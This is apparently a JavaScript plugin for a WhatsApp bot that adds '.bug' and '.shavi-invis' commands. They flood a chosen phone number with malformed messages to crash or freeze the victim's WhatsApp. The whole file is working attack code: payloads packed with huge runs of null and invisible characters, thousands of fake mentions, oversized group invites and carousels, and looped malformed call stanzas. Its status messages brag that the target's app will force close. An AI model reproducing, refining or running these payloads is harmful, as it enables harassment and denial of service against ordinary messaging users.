const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { 
        const baileys = require('@adiwajshing/baileys');
        generateWAMessageFromContent = baileys.generateWAMessageFromContent;
        proto = baileys.proto;
    } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: download image from URL
async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        console.error('Image download failed:', url, error.message);
        return null;
    }
}

// Helper: validate target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ULTRA CRASH FUNCTIONS ====================

// 1. FcUiFlows – 2000 mentions + malformed interactive flow
async function FcUiFlows(conn, target) {
    const mentionedJidList = [
        target,
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const Params = "{[(".repeat(20000);
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "", hasMediaAttachment: false },
                    body: { text: "</𖥂 gw Ganteng\\>" },
                    nativeFlowMessage: {
                        messageParamsJson: Params,
                        buttons: [
                            { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "send_location", buttonParamsJson: "{}" },
                            { name: "payment_method", buttonParamsJson: "" },
                            { name: "form_message", buttonParamsJson: "" },
                            { name: "catalog_message", buttonParamsJson: "" },
                            { name: "review_and_pay", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" }
                        ]
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        remoteJid: target,
                        forwardingScore: 250208,
                        isForwarded: false,
                        mentionedJid: mentionedJidList
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
}

// 2. SpcmCrash2 – Force close via malformed interactive message
async function SpcmCrash2(conn, target) {
    const maklo = JSON.stringify({
        status: true, criador: "Ganz — DΣV", sessionName: "./sessions/maklo", isConnected: true,
        uptime: 10240, bugMethod: "sql_injection", resultado: { type: "md", ws: { _eventsCount: 500000, url: "wss://web.whatsapp.com/ws/chat" } }
    });
    const sections = [];
    for (let i = 0; i < 25; i++) {
        sections.push({
            title: "Ganz",
            highlight_label: `Ngewe ${i}×`,
            rows: [
                {
                    title: "Ganz",
                    id: `id${i}`,
                    subrows: [
                        { title: "Ganz", id: `/${i}`, subsubrows: [{ title: "Ganz", id: `/${i}` }, { title: "Ganz.", id: `/${i}` }] },
                        { title: "Ganz Alwayss !", id: `/${i}` }
                    ]
                }
            ]
        });
    }
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target, "13135550002@s.whatsapp.net"],
                        isForwarded: true, forwardingScore: 999,
                        businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
                        participant: "0@s.whatsapp.net", remoteJid: target
                    },
                    body: { text: "Ganzz Alwayss!" },
                    footer: { buttonParamsJson: "{[".repeat(9000) },
                    header: { buttonParamsJson: "]}".repeat(9000), subtitle: "Ganzz Alwayss !", hasMediaAttachment: false },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(9000),
                        buttons: [
                            { name: "single_select", buttonParamsJson: maklo },
                            { name: "call_permission_request", buttonParamsJson: maklo },
                            { name: "call_permission_request", buttonParamsJson: maklo },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
    await sleep(100);
    try { await conn.sendMessage(target, { delete: msg.key }); } catch(e) {}
}

// 3. CarouselVY – Carousel spam (200 cards – extreme memory load)
async function CarouselVY(conn, target) {
    const memec = "ꦾ".repeat(9999);
    const invisible = "\u2060".repeat(3000);
    const img = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=",
        fileLength: "59668",
        height: 736,
        width: 736,
        mediaKey: "YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=",
        fileEncSha256: "rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=",
        directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
        mediaKeyTimestamp: "1753601096",
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
    };
    const basePayload = { header: "ϟ", body: "Ganz", flow_action: "Salvadores", flow_action_payload: { screen: "Soviet" }, flow_cta: "1", flow_id: "1", flow_message_version: "1", flow_token: "1" };
    const cards = [];
    for (let i = 0; i < 200; i++) {
        cards.push({
            header: { hasMediaAttachment: true, imageMessage: img, title: invisible + "꧔꧈" + i },
            body: { text: memec },
            footer: { text: "꧔꧈" + i },
            nativeFlowMessage: {
                buttons: [
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{", flow_id: "1", flow_token: "{[" }) },
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{{", flow_id: "{[" }) }
                ]
            }
        });
    }
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    body: { text: memec },
                    footer: { text: "Ganz" },
                    header: { hasMediaAttachment: true, imageMessage: img },
                    carouselMessage: { cards }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// 4. BlankVVIP – Group invite overflow
async function BlankVVIP(conn, target) {
    const MSG = {
        groupInviteMessage: {
            groupJid: "120363370626418572@g.us",
            inviteCode: "Xx".repeat(10000),
            inviteExpiration: "99999999999",
            groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) + "._.*_*._>".repeat(5000),
            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
            contextInfo: {
                expiration: 1, ephemeralSettingTimestamp: 1, entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net",
                questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
            },
            body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
            footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
            nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
            buttons: [
                { name: "cta_url", buttonParamJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) }) },
                { name: "cta_call", buttonParamJson: JSON.stringify({ displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) }) },
                { name: "cta_copy", buttonParamJson: "\u0000".repeat(25000) }
            ]
        }
    };
    await conn.relayMessage(target, MSG, { participant: { jid: target } });
}

// 5. NotifCallBang – 50 call attempts with malformed keys
async function NotifCallBang(conn, target) {
    const overflowBuffer = "\u0000".repeat(90000);
    const negativeInt = -9999999999999;
    const maxInt = Number.MAX_SAFE_INTEGER;
    const jsonBomb = "{".repeat(1999999);
    const rtlBomb = "\u202E".repeat(50000);
    const callId = overflowBuffer + crypto.randomBytes(32).toString('hex').repeat(100) + rtlBomb;
    const encKey = Buffer.alloc(99999, 0xFF);
    const malformedKey = Buffer.concat([encKey, Buffer.from(overflowBuffer), encKey]);
    try {
        for (let i = 0; i < 50; i++) {
            const stanza = {
                tag: 'call',
                attrs: { id: overflowBuffer + conn.generateMessageTag(), from: overflowBuffer + conn.user.id, to: target + overflowBuffer },
                content: [{
                    tag: 'offer',
                    attrs: { 'call-id': callId, 'call-creator': overflowBuffer + conn.user.id, 'call-duration': negativeInt, 'call-timestamp': negativeInt, 'call-retry': maxInt },
                    content: [
                        { tag: "audio", attrs: { enc: "opus".repeat(10000), rate: negativeInt.toString() } },
                        { tag: "video", attrs: { orientation: negativeInt.toString(), screen_width: maxInt.toString(), screen_height: maxInt.toString(), device_orientation: overflowBuffer, enc: "vp8".repeat(50000), dec: overflowBuffer } },
                        { tag: "malformed_payload", attrs: {}, content: jsonBomb }
                    ]
                }, {
                    tag: 'terminate',
                    attrs: { 'call-id': callId, 'reason': overflowBuffer, 'participant': overflowBuffer + target }
                }]
            };
            await conn.query(stanza);
            await conn.sendMessage(target, { text: rtlBomb + "GOOD BYE" + overflowBuffer, mentions: [target] });
            await sleep(100);
        }
    } catch (err) { console.error("NotifCallBang error:", err.message); }
}

// ==================== .bug – ULTRA POWER (all functions + 100 mixed payloads) ====================
async function ultraBugCrash(conn, target) {
    // Base image for product messages
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    // --- 100 mixed payloads (original) ---
    for (let i = 0; i < 100; i++) {
        // Product message
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage,
                            productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                            description: "MY Bad" + "\u2060".repeat(60000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status",
                            productImageCount: 9999999,
                            firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        },
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // Interactive message
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(80000) },
                footer: { text: "\u0000".repeat(90000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
                contextInfo: { mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // List message
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
                footerText: "Xeon Bug" + "\u2060".repeat(50000),
                description: "Xeon Bug" + "\u0000".repeat(50000),
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // Live location message
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(50000),
                        degreesLongitude: "p".repeat(50000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                        sequenceNumber: "0",
                        jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // Sticker message
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                fileLength: "9999999999999999999",
                isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});
    }

    // --- Additional ultra functions ---
    await FcUiFlows(conn, target);
    await SpcmCrash2(conn, target);
    await CarouselVY(conn, target);
    await BlankVVIP(conn, target);
    await NotifCallBang(conn, target);
}

// ==================== .shavi-invis (invisible crash) ====================
async function shaviInvisCrash(conn, target) {
    // Payload 1: Interactive with 800k invisible chars
    const msg1 = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999999, degreesLongitude: 9999999 }, hasMediaAttachment: true },
            body: { text: '\u2060'.repeat(800000) },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1500000) },
            contextInfo: { mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg1.message, {});

    // Payload 2: Ephemeral with 600k invisible chars
    const msg2 = generateWAMessageFromContent(target, {
        ephemeralMessage: {
            message: {
                extendedTextMessage: {
                    text: '\u2063'.repeat(600000),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1500 }, () => `2${Math.floor(Math.random() * 8000000)}@s.whatsapp.net`),
                        stanzaId: '\u0000'.repeat(50000)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg2.message, {});

    // Payload 3: List response with invisible title
    const sections = [];
    for (let i = 0; i < 30; i++) {
        sections.push({
            title: '\u2060'.repeat(40000),
            rows: [{ title: '\u2063'.repeat(40000), rowId: '\u0000'.repeat(40000) }]
        });
    }
    const msg3 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: '\u2060'.repeat(90000),
                    sections: sections,
                    contextInfo: { mentionedJid: Array.from({ length: 1500 }, () => `3${Math.floor(Math.random() * 7000000)}@s.whatsapp.net`) }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg3.message, {});

    // Payload 4: Group status mention
    const msg4 = generateWAMessageFromContent(target, {
        groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: Array.from({ length: 1000 }, () => `4${Math.floor(Math.random() * 6000000)}@s.whatsapp.net`),
            contextInfo: { mentionedJid: Array.from({ length: 1000 }, () => `5${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg4.message, {});
}

// ==================== COMMANDS ====================

cmd({
    pattern: "bug",
    desc: "💀 ULTRA POWER CRASH – All exploits combined (instant force close / black screen)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *SHAVIYA XMD ULTRA CRASH* → ${target}\n_Triggering all 5 exploit layers + 100 payloads..._`);
    try {
        await ultraBugCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ ULTRA CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close immediately. Screen may turn black.*` });
        } else {
            await reply(`✅ ULTRA CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp will force close immediately. Screen may turn black.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, freezes target silently",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVIYA XMD INVISIBLE CRASH* → ${target}\n_Sending invisible payloads..._`);
    try {
        await shaviInvisCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target WhatsApp will freeze without seeing any message.*` });
        } else {
            await reply(`✅ INVISIBLE CRASH SENT → ${target}\n⚠️ *Target WhatsApp will freeze without seeing any message.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== BUG MENU (with stylish text and image) ====================
cmd({
    pattern: "bugmenu",
    desc: "Show ultra crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Uʟᴛʀᴀ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 Uʟᴛʀᴀ Pᴏᴡᴇʀ Cʀᴀsʜ (ᴀʟʟ ᴇxᴘʟᴏɪᴛs)*\n*│ 📌 .shavi-invis : 🔮 Iɴᴠɪsɪʙʟᴇ Cʀᴀsʜ (ɴᴏ ᴛᴇxᴛ)*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Exᴛʀᴇᴍᴇ ᴘᴏᴡᴇʀ – ᴜsᴇ ᴏɴʟʏ ᴏɴ ɴᴜᴍʙᴇʀs ʏᴏᴜ ᴏᴡɴ.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
